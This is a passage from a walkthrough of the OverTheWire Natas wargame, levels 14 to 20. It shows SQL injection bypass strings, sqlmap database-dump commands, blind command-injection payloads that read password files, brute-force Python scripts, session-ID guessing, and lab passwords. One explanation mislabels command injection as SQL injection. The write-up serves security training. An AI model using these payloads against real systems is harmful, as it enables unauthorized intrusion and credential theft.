    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```
Explaining the code
```
1. The script checks if the "username" key exists in the user input.
2. It establishes a connection to a MySQL database.
3. A SQL query is constructed using user-supplied "username" and "password" values without proper sanitization.
4. If the "debug" key is present, the executed query is displayed (a potential security risk).
5. The query is executed, and if it returns any rows, a successful login message is echoed.
6. If the login fails (no rows returned), an "Access denied" message is displayed.
7. The database connection is closed.
```
 From the source code we get the sql query to be this

 ```
SELECT * from users where username="<username>" and password="<password>"
```
You’ll notice that the user input is not being filtered, which means we can use escape characters to make the query act differently than it should be

To bypass the login page

username:```" '1'='1'#```    password:```aaa```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7bbb4b62-c2df-4683-99d6-8536058dd0c9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13202054-1539-4e02-956d-437c3fe06c0b)

Cool, we got the password for  the next level



# Level 15

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8a4bdaa-70ad-4c63-bed4-5f016b223a68)

Navigate to the webpage and use the password we got from the previous level

username:```natas15```        password:```TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa5c82e5-2c1d-4def-8965-18e9e1232605)

Checking the source code

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```
Explaining the code
```
1. The script checks if the provided "username" exists in the "users" table.
2. It establishes a connection to a MySQL database using credentials.
3. A SQL query is constructed to select rows from the "users" table based on the "username" column.
4. If the "debug" key is present, the executed query is displayed (for debugging purposes).
5. The query is executed, and if there are rows returned, it indicates that the user exists.
6. If no rows are returned, it indicates that the user doesn't exist.
7. If an error occurs during the query execution, an error message is displayed.
8. The database connection is closed
```
The sql query from then source code is ```SELECT * FROM users WHERE username="<username>"```

Lets try the username ```natas16``` to see if it exists

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/17e6293e-418e-40ab-9fee-2a53c3706b17)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/efeb46b8-1939-4163-84ea-ea3e98b582b2)

Now, this is a ```boolean-based SQLi```. Lets prepare a payload that returns a true value

payload:```" or '1'='1'#```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/05922a52-dc38-4c09-b24c-9c306cb11fb9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2df9bf67-c75b-44d4-b02c-c0448e270566)

We'll be using sqlmap to dump the database.

First, capture the request on burpsuite and save it in a file, say ```req.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dbb7397-ef9e-4971-8369-165d8fccd1bc)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8d854b1-95cf-4731-873d-d464e16180c4)

Using sqlmap;

command:```sqlmap -r req.txt --level=5 --risk=3 -D natas15 -T users -C username,password --dump```

Let me explain this command

```
-r --> This tells sqlmap to use the request stored in req.txt file as the basis for analysis
-D --> Database name which is natas15 (Saw this from the source code)
-T --> Table name which is users (Got this from the sql query)
-C --> Column names which are username and password (Got this also from the sql query)
--dump --> This option tells sqlmap to dump the contents of the selected columns
--risk=3 --> This option sets the risk factor to 3, indicating a high-risk level for the injection attack
--level=5 --> This option sets the level of tests to be performed by SQLMap to the highest level, which is 5
```
Running the command;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84d36cd6-96ed-4053-99aa-e9e643dda098)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9d6fbfb9-467c-4368-ba4b-c7677427556d)

Cool, we got  the password for the next level



# Level 16

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f2d36d45-5184-46c2-bb51-bb184ca971e2)

Navigating to the webpage and using the password we got from the previous level

username:```natas16```        password```TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a1e9d3c8-b88c-41e6-a827-57d8bfd56734)

Viewing the source code we get this php code

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
This code is similar to the one in in level 10, it's just that this code is more secured. It filters out more special characters. One thing I noticed is that it didn't filter out the character ```$```,```)``` and ```(```.

Trying this command ```$(sleep 10)``` made me realize I was dealing with a blind command injection. When you run that command, you'll notice that it'll take the webpage exactly 10 seconds to return an output

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f1b91045-f913-4425-b744-b1169e779f47)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13ee7026-224b-45c7-b899-49c6e925c524)

We can go ahead to inject code

command:```$(echo person)```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b272aa0e-18ed-4c49-be05-378d29c41503)

If you recall when we solved level 10 we had to check if the character exists in the file, well this is similar

So, does ```/etc/natas_webpass/natas17``` contains the letter ```a```??

To test this we can try the conmand ```person$(grep a /etc/natas_webpass/natas17)``` if the letter is  present in the file the output will be empty, if the letter isn't present the output will be ```person```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f474b1f-2057-4952-9e84-957700ec4ccb)

As, you can see there's an output 

Lets try for the letter ```b```

command:```person$(grep b /etc/natas_webpass/natas17)```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b26e09a9-8881-4a38-bbfa-dddcfeae79ea)

As you can see, there's no output. This means the letter ```b``` is present in the ```/etc/natas_webpass/natas17``` file.

We'll be using a python script to get the full password to the next level

```python
#!/bin/python
import requests,string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

characters = ''.join([string.ascii_letters,string.digits])

password = []
for i in range(1,34):
    for char in characters:
        uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url,''.join(password),char)
        r = requests.get(uri, auth=(auth_username,auth_password))
        if 'hackers' not in r.text:
            password.append(char)
            print(''.join(password))
            break
        else: continue

   break
```
<font color="green">The Python code performs a blind-based SQL injection attack to extract the password character by character from a target web application. It iterates through a character set and constructs URLs with injection payloads. By analyzing the response, it determines whether each character is part of the password and appends it to the password list. The code continues this process until the complete password is retrieved</font>

Save the  script in a file and run it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/be992da2-006f-43fa-b88b-a26d0dfcd638)

Cool, we got the password to the next level



# Level 17

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86ee49fb-b95f-4246-b030-c7ff399769ea)

Navigating to the webpage and using the password we got from the previous level

username:```natas17```         password:```XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b924eee-914b-4664-a2ef-0d825cb25f43)

Viewing the source code;

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```
Explaining the code
```
1. It connects to a MySQL database and selects the "natas17" database.
2. The code constructs a SQL query to retrieve records from the "users" table based on the provided username.
3. If the query execution is successful, it checks if any rows are returned.
4. The code does not provide specific output for the existing or non-existing user cases.
5. Any query execution errors are not handled or displayed.
```
Lets try to see if user ```natas18``` exists in the data

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eeb4615d-c1ec-4632-890a-d433de3d07e4)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9f26080f-aff9-4cf4-ae3a-bd8a14d8f7f0)

As you can see, there was no output. If you recall when we were on ```Level 15``` we had to solve a ```boolean-based SQLi```. In this level we are dealing with a ```boolean-based blind SQLi``` or ```time-based blind SQLi```. Unlike in ```boolean-based SQLi``` where we receive feedbacks, in ```boolean-based blind SQLi``` we inject malicious SQL code into the vulnerable web application, but do not receive direct feedback about the results of the injected queries.

We'll be using sqlmap to dump te database

First, capture the request using burpsuite  and save it in a file, say ```req.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c69ea5ce-dfdc-4469-9538-11b3cb79737e)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4defbe6f-6973-460e-9b9f-323327c53b39)

using sqlmap;

command:```sqlmap -r req.txt --level=5 --risk=3 -D natas17 -T users -C username,password --dump```

Explaining the command
```
-r --> This tells sqlmap to use the request stored in req.txt file as the basis for analysis
-D --> Database name which is natas15 (Saw this from the source code)
-T --> Table name which is users (Got this from the sql query)
-C --> Column names which are username and password (Got this also from the sql query)
--dump --> This option tells sqlmap to dump the contents of the selected columns
--risk=3 --> This option sets the risk factor to 3, indicating a high-risk level for the injection attack
--level=5 --> This option sets the level of tests to be performed by SQLMap to the highest level, which is 5
```
Running the command;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a09a4522-f60f-4174-97bd-f4673e7c37c9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e9b1ab7a-a1af-416c-a47d-6ba4ea085ddc)

Cool stuff, we got the password for the next level😎



# Level 18

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6c318c0d-a1b4-4c1f-b267-7dd6542d5c44)

Navigating to the webpage and using the password we got from the previous level

username:```natas18```               password:```8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c0ba30b-729f-4641-a290-a5ea5f5629dd)

Viewing the source code;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7d5681be-22d3-4199-a539-a3097936480e)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cd3be324-f398-40ba-b585-54e7acde5e63)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b2bfddc7-8762-4ebd-bdef-e8fb6d1faa08)


Explaining this code
```
1. The initial part of the code sets a maximum ID value and defines several functions, such as isValidAdminLogin(), isValidID(), createID(), debug(), and my_session_start(). These functions handle tasks like checking if a login is valid, validating user IDs, creating session IDs, debugging output, and starting the session.
2. The print_credentials() function is responsible for displaying the user's credentials, either as an admin or a regular user.
3. The script checks if a session is already active by calling my_session_start(). If a session is active, it calls print_credentials() and sets $showform to false, indicating that the login form should not be displayed.
4. If a session is not active, it checks if the username and password parameters are present in the $_REQUEST superglobal. If so, it generates a session ID using createID() with the provided username, starts the session, and sets the $_SESSION["admin"] value based on the result of isValidAdminLogin(). It then calls print_credentials() and sets $showform to false.
5. If neither a session is active nor the username and password parameters are provided, the script assumes the user needs to log in and displays a login form.
```
Lets try to login with something random, say

username:```BlackAnon```      password:```groceriesandfloatingberries```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f7d4502f-ee15-4bdd-860e-a566544fcdf2)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4f295ce8-f874-43ad-a002-560deeb06d26)

Okay, so we need to be logged in as the admin so as to be able to view the password we would be using for the next level.

Lets capture this request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e5aa42d4-f4fc-4f78-bb5b-c4229f137917)

Sending this over to burp repeater;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/808dbe8a-b722-48cd-a83a-aa17e0a595d7)

Take note of the ```PHPSESSID=330```, checking the source code again, you'll see this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/369d32f6-3282-4e90-8fe8-1d11778a5878)

This means the highest value ```PHPSESSID``` can hold is ```640```.

What we'll do is that we'll use burp intruder to get the correct ```PHPSESSID``` for the ```Admin``` user.

Send the request to burp intruder;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6e1216d8-7b3b-484e-a363-7f4e1f09d8c9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6f75a596-bba5-465c-9b8b-998dfd0947cd)

Now, start the attack

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/37815af9-fb5b-4b1e-8adf-bb1a7fc97fd2)

From the above screenshot we can see that the payload ```119``` has a different length compared to the other payloads.

I think we just  found the Admin user's PHPSESSID hehe. Replacing the ```330``` with ```119``` we should be able to get the password that'll help us in the next level

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0af8d06f-1676-4c58-88f2-a79fb29d8abc)

Cool, we got the password to the next level.



# Level 19

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a4f8a59-12f5-4dbd-b570-bdb572e6e9fe)

Navigating to the webpage and using the password we found from the previous level

username:```natas19```         password:```8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c9cd0bae-70cf-4251-8cda-fcbe87135e5d)

So, this level uses the same code as the previous level, the  difference is just that in this level session IDs are no longer sequential

Lets use the previous creds we used in the previous level

username:```BlackAnon```       password:```groceriesandfloatingberries```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b3ef551b-46d2-428c-9a71-fcf9a1f5d47f)

Capturing the request on burpsuite;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6460ffb1-8fb5-44a6-9a37-c71407238b27)

Sending it over to repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cdca4458-14da-444d-a169-c00451a8114f)

As you can see the value for ```PHPSESSID``` is different unlike the one we saw in the previous level.

Lets try to decode this ```PHPSESSID``` using [cyberchef](https://gchq.github.io/CyberChef/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/734b4f63-2e5a-4930-8c58-b22464472fe4)

If you recall from the source code of the previous level we saw that ```$maxid = 640```, so one thing we'll try is to generate new ```PHPSESSID```. To do this we'll be using a python script

```python
def number_to_blackanon_hex(number):
    if not 1 <= number <= 640:
        raise ValueError("Number must be between 1 and 640.")

    # Append "BlackAnon" to the number
    blackanon_string = str(number) + "-admin"

    # Convert the string to hexadecimal representation
    hex_representation = blackanon_string.encode().hex()

    return hex_representation

# Open the file in write mode
with open("phpsessid.txt", "w") as file:
    # Write the output for numbers from 1 to 640 to the file
    for number in range(1, 641):
        hex_result = number_to_blackanon_hex(number)
        line = f"{hex_result}\n"
        file.write(line)

print("Output has been written to phpsessid.txt")
```
The script takes numbers from 1 to 640, appends "-admin" to each number, converts them to hexadecimal representation, and writes the results to a file named "phpsessid.txt."

save the script in a file and run it

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ python phpsessid.py
Output has been written to phpsessid.txt
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ head phpsessid.txt    
312d61646d696e
322d61646d696e
332d61646d696e
342d61646d696e
352d61646d696e
362d61646d696e
372d61646d696e
382d61646d696e
392d61646d696e
31302d61646d696e
```
Lets capture the request again and send it over to burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4791aae9-b59f-4998-bba4-70f37e3dcb55)

We'll go ahead to load the ```phpsessid.txt``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5d530025-876b-4ff8-b8eb-ce16314684e0)

Now, start the attack

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/572e20cd-6378-4b6f-bdb5-572bada2b00e)

From the above screenshot we can see that ```3238312d61646d696e``` has a different length compared to the other payloads

We already found the admin's ```PHPSESSID``` hehe😎

Replacing the cookies

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6911823f-7fdf-470e-a313-9d9e72772f33)

Cool stuff, we got the password to the next level



# Level 20

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/217be71f-8c33-4a74-8657-1454cd980a45)

Navigating to the webpage and using the password we got from the previous level

username:```natas20```          password:```guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/14e1b4b2-29b9-4da3-90bc-fc985106f7c9)

Viewing the source code, we get this long php code

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8ddf8b73-dfc0-4297-9e2f-a1ced15f9fa5)

Explaining this code
```
1. The debug($msg) function is used for debugging and prints the provided message with the "DEBUG:" prefix if the "debug" key exists in the URL parameters.
2. The print_credentials() function displays user credentials for the next level if the user is logged in as an admin (checked through session data). The username is "natas21," but the password is intentionally censored and not revealed in the output. If the user is not an admin or not logged in, a message prompts them to log in as an admin to view the credentials.
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a0b86c0f-052e-4d5a-9b5c-13564ffcae43)

Explaining this code
```
1. The myread($sid) function reads session data from a session file based on the provided session ID ($sid).
2. It checks if the session ID contains only alphanumeric characters and the hyphen ("-"). If the session ID contains any other characters, it's considered invalid, and the function returns an empty string.
3. The function constructs the filename of the session file using the session save path and the provided session ID.
4. If the session file does not exist, the function returns an empty string.
5. The function reads the contents of the session file into the variable $data.
6. It resets the $_SESSION superglobal array to an empty array.
7. It processes each line of the session data, splitting it into key-value pairs using space as a delimiter and populates the $_SESSION array.
8. Finally, the function returns the encoded session data stored in the $_SESSION array, which can be sent back to the client to maintain session state between requests.
```
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a22dfcc9-c5ba-47b9-bb02-343ede9abd8c)

Explaining this code
```
1. The mywrite function saves session data to a file with a custom encoding.
2. It checks if the session ID ($sid) contains only alphanumeric characters and hyphens.
3. It constructs the filename using the session save path and the provided session ID.
4. It sorts the session data array ($_SESSION) based on keys in ascending order.
5. It iterates through the sorted session array, concatenates key-value pairs into a string, and saves it as the new $data.
6. The function writes the new $data to the session file.
7. It sets the file permissions of the session file to 0600 (read and write only for the owner).
```
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1d9b3cb4-5f27-4c04-ad31-321f49fadc00)

Explaining this code
```
1. Sets custom session handling functions using session_set_save_handler.
2. Starts or resumes a session using session_start().
3. If the "name" parameter exists in the HTTP request, it sets the "name" session variable to its value and prints a debug message.
4. Calls the print_credentials() function.
5. Checks if the "name" session variable exists and assigns its value to the $name variable.
```
The sessions are handled by ```session_set_save_handler``` and are saved in a directory manually. The ```print_credentials()``` prints our desired credentials if ```$_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1```. This means if there's a ```$_SESSION``` variable with a key "admin" and that the key has the value of "1". 







    























  

